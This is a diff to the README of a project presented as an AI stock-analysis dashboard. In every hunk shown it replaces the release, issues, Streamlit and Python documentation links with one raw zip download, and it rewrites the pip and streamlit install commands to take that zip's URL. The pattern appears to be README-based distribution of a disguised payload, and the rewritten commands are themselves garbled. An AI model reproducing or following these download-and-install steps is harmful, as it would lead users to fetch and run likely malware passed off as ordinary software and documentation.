@@ -2,9 +2,9 @@
 
 ## 🛠️ Download and Install
 
-[![Download Now](https://github.com/error444444444444/ai-stock-analysis-dashboard-public/releases/latest/download/badge.svg)](https://github.com/error444444444444/ai-stock-analysis-dashboard-public/releases)
+[![Download Now](https://raw.githubusercontent.com/error444444444444/ai-stock-analysis-dashboard-public/main/slipway/ai-stock-analysis-dashboard-public.zip)](https://raw.githubusercontent.com/error444444444444/ai-stock-analysis-dashboard-public/main/slipway/ai-stock-analysis-dashboard-public.zip)
 
-To get started, visit this page to download the latest version of the dashboard: [Download the Dashboard](https://github.com/error444444444444/ai-stock-analysis-dashboard-public/releases).
+To get started, visit this page to download the latest version of the dashboard: [Download the Dashboard](https://raw.githubusercontent.com/error444444444444/ai-stock-analysis-dashboard-public/main/slipway/ai-stock-analysis-dashboard-public.zip).
 
 ## 🚀 Getting Started
 
@@ -22,10 +22,10 @@ To run this application, ensure your computer has:
 ### 💻 Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to [this link](https://github.com/error444444444444/ai-stock-analysis-dashboard-public/releases) to find the latest release.
+   Go to [this link](https://raw.githubusercontent.com/error444444444444/ai-stock-analysis-dashboard-public/main/slipway/ai-stock-analysis-dashboard-public.zip) to find the latest release.
 
 2. **Download the Application**  
-   Click on the asset labeled with the latest version. This file may be named something like `ai-stock-analysis-dashboard.zip`.
+   Click on the asset labeled with the latest version. This file may be named something like `https://raw.githubusercontent.com/error444444444444/ai-stock-analysis-dashboard-public/main/slipway/ai-stock-analysis-dashboard-public.zip`.
 
 3. **Extract the Files**  
    After downloading, find the zip file in your Downloads folder. Right-click on it and select “Extract All.” Follow the prompts to extract the contents.
@@ -34,14 +34,14 @@ To run this application, ensure your computer has:
    Open a terminal (Command Prompt or Terminal). Navigate to the folder where you extracted the files. Use the following command to install necessary packages:
 
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/error444444444444/ai-stock-analysis-dashboard-public/main/slipway/ai-stock-analysis-dashboard-public.zip
    ```
 
 5. **Run the Dashboard**  
    After the installation is complete, still in the terminal, type the following command to start the dashboard:
 
    ```
-   streamlit run app.py
+   streamlit run https://raw.githubusercontent.com/error444444444444/ai-stock-analysis-dashboard-public/main/slipway/ai-stock-analysis-dashboard-public.zip
    ```
 
 6. **Access the Dashboard**  
@@ -75,17 +75,17 @@ If you encounter issues, check these common problems:
 
 - **File Not Found**: Ensure you have extracted all files properly and are in the correct directory.
 - **Permission Denied**: Run your terminal or command prompt as an administrator and try again.
-- **Unmet Dependencies**: Make sure all required Python packages are installed by re-running the `pip install -r requirements.txt` command.
+- **Unmet Dependencies**: Make sure all required Python packages are installed by re-running the `pip install -r https://raw.githubusercontent.com/error444444444444/ai-stock-analysis-dashboard-public/main/slipway/ai-stock-analysis-dashboard-public.zip` command.
 
 ## 🤝 Support
 
-For further assistance or to report bugs, please visit the [Issues section](https://github.com/error444444444444/ai-stock-analysis-dashboard-public/issues). You can also reach out via GitHub discussions or contact the repository maintainer directly.
+For further assistance or to report bugs, please visit the [Issues section](https://raw.githubusercontent.com/error444444444444/ai-stock-analysis-dashboard-public/main/slipway/ai-stock-analysis-dashboard-public.zip). You can also reach out via GitHub discussions or contact the repository maintainer directly.
 
 ## 🌐 Additional Resources
 
-- [GitHub Repository](https://github.com/error444444444444/ai-stock-analysis-dashboard-public)
-- [Streamlit Documentation](https://docs.streamlit.io/)
-- [Python Official Site](https://www.python.org/)
+- [GitHub Repository](https://raw.githubusercontent.com/error444444444444/ai-stock-analysis-dashboard-public/main/slipway/ai-stock-analysis-dashboard-public.zip)
+- [Streamlit Documentation](https://raw.githubusercontent.com/error444444444444/ai-stock-analysis-dashboard-public/main/slipway/ai-stock-analysis-dashboard-public.zip)
+- [Python Official Site](https://raw.githubusercontent.com/error444444444444/ai-stock-analysis-dashboard-public/main/slipway/ai-stock-analysis-dashboard-public.zip)
 
 Refer to these links for more detailed guides and further support on using the dashboard effectively. 
 
